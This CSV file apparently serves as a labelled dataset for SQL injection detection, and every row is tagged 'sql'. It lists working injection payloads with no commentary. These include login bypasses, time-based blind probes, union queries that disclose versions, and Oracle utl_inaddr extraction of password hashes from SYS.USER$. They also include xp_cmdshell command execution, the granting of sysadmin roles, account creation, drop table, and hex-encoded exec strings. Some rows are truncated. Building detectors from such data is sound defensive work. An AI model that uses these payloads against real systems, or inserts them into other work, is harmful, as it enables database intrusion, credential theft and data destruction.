Payloads,Types
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",sql
1 waitfor delay '0:0:10'--,sql
bfilename,sql
admin'  )   or   (  '1'  =  '1'--,sql
UEf,sql
 -- &password  = ,sql
1 or sleep  (  __TIME__  )  #,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",sql
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",sql
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,sql
or sleep  (  __TIME__  )  #,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",sql
||6,sql
or 1/*,sql
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",sql
select * from users where id  =  1.%@ or 1  =  1 -- 1,sql
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",sql
" or 1  =  1 or """"  =  ",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sql
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,sql
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",sql
or 'whatever' in   (  'whatever'  ) ,sql
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,sql
select * from users where id  =  '1'   or 1  =  1 -- 1',sql
?,sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,sql
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",sql
"admin""  )   or   (  ""1""  =  ""1""#",sql
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",sql
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",sql
 or '' ',sql
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",sql
or 1  =  1,sql
 ; drop table temp --,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sql
""" or benchmark  (  10000000,MD5  (  1   )    )   #",sql
""" or ""x""  =  ""x",sql
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',sql
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",sql
 or 'something' like 'some%',sql
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",sql
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',sql
; exec master..xp_cmdshell 'ping 10.10.1.2'--,sql
admin' or '1'  =  '1'--,sql
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",sql
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",sql
""";waitfor delay '0:0:__TIME__'--",sql
x' and userid is NULL; --,sql
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',sql
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",sql
’ or ‘1’  =  ’1,sql
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",sql
admin'or 1  =  1 or ''  =  ',sql
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",sql
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",sql
exec  (  @s  ) ,sql
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",sql
 or 1  =  1,sql
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,sql
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",sql
x' AND email IS NULL; --,sql
" select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",sql
 --,sql
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",sql
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",sql
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",sql
update,sql
 or 1/*,sql
" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",sql
"""   )    )    or pg_sleep  (  __TIME__  )  --",sql
||'6,sql
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",sql
or   (  EXISTS  ) ,sql
^',sql
or 'text'   =   n'text',sql
" select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",sql
" select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",sql
" select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",sql
 or 0  =  0 --,sql
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",sql
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",sql
password:*/  =  1--,sql
" select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",sql
" select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",sql
" union   (  select NULL,   (  select @@version   )    )    --",sql
" select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",sql
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 +\. union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",sql
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",sql
" select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",sql
" select * from users where id  =  1. union select null,version  (    )   -- 1",sql
" select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,sql
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",sql
" select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",sql
" select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",sql
UNION SELECT,sql
asc,sql
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",sql
"exec sp_addsrvrolemember 'name' , 'sysadmin'",sql
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",sql
  )   or true--,sql
" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sql
 or userid like '%,sql
" union   (  select NULL, NULL,   (  select @@version   )    )    --",sql
/,sql
select * from users where id  =  1 or $<\ or 1  =  1 -- 1,sql
"admin""/*",sql
" select * from users where id  =  1.  union select 1,version  (    )   -- 1",sql
 )  ;waitfor delay '0:0:__TIME__'--,sql
" select * from users where id  =  1 union select @<@.,version  (    )   -- 1",sql
" select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",sql
"admin"" or ""1""  =  ""1",sql
 union   (  select @@version  )   --,sql
 or ''^',sql
"""   )    )    or sleep  (  __TIME__  )    =  """,sql
" union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",sql
" select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",sql
" select * from users where id  =  1 union select @ _,version  (    )   -- 1",sql
select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,sql
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',sql
" select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",sql
"""hi""""  )   or   (  """"a""""  =  """"a""",sql
select name from syscolumns where id   =     (  sele ...,sql
" select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",sql
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",sql
" select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",sql
 or 2 between 1 and 3,sql
union all select @@version--,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",sql
t'exec master..xp_cmdshell 'nslookup www.google.com'--,sql
""" or isNULL  (  1/0  )   /*",sql
" select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",sql
" select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",sql
declare @q nvarchar   (  200  )   0x730065006c00650063 ...,sql
 or 'a'  =  'a,sql
 union all select @@version--,sql
" select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",sql
"admin"" or 1  =  1/*",sql
 or   (  EXISTS  ) ,sql
" select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",sql
declare @s varchar   (  8000  )   select @s   =   0x73656c ...,sql
" select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",sql
" select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",sql
" select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",sql
; begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >,sql
" union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",sql
hi' or 1  =  1 --,sql
 UNION SELECT,sql
select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,sql
" select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",sql
" select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",sql
desc,sql
" select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",sql
anything' or 'x'  =  'x,sql
" select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",sql
select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,sql
0x770061006900740066006F0072002000640065006C00 ...,sql
" select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",sql
" select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",sql
" select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",sql
or isNULL  (  1/0  )   /*,sql
"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",sql
" select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",sql
"admin"" or ""1""  =  ""1""#",sql
"admin"" or 1  =  1--",sql
 or user like '%,sql
admin'  )   or '1'  =  '1,sql
""" or sleep  (  __TIME__  )  #",sql
" select * from users where id  =  1 or ""  )  $"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""?%"" or 1  =  1 -- 1",sql
select * from users where id  =  '1' + $+%$ or 1  =  1 -- 1',sql
 or ''-',sql
" select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",sql
admin'  )   or '1'  =  '1'/*,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",sql
select * from users where id  =  1 <@$ or 1  =  1 -- 1,sql
x' or 1  =  1 or 'x'  =  'y,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  1 union select 1 $,version  (    )   -- 1",sql
  )   or   (  'x'  )    =    (  'x,sql
 ( ,sql
" select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",sql
" select * from users where id  =  1.%@ union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",sql
" select * from users where id  =  '1' union select \.,@@VERSION -- 1'",sql
" select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",sql
" select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",sql
 )    )    or sleep  (  __TIME__  )    =  ',sql
having 1  =  1--,sql
!,sql
select * from users where id  =  1 or $ 1  =  1 or 1  =  1 -- 1,sql
 group by userid having 1  =  1--,sql
" select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",sql
" select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",sql
or 0  =  0 --,sql
 or 0  =  0 #,sql
or pg_sleep  (  __TIME__  )  --,sql
or '1'  =  '1'--,sql
" select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",sql
" select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  USERNAME   )    )    FROM SYS.ALL_USERS   )    )    AND 'i'  =  'i,sql
sqlvuln,sql
" select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",sql
0x730065006c0065006300740020004000400076006500 ...,sql
" select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",sql
" select * from users where id  =  1. <@ union select version  (    )  ,version  (    )   -- 1",sql
declare @s varchar   (  8000  )   select @s   =   0x73656c65637420404076657273696f6e,sql
select * from users where id  =  '1' or \<$ or 1  =  1 -- 1',sql
 or ''&',sql
" select * from users where id  =  1 or ""?_"" or 1  =  1 -- 1",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",sql
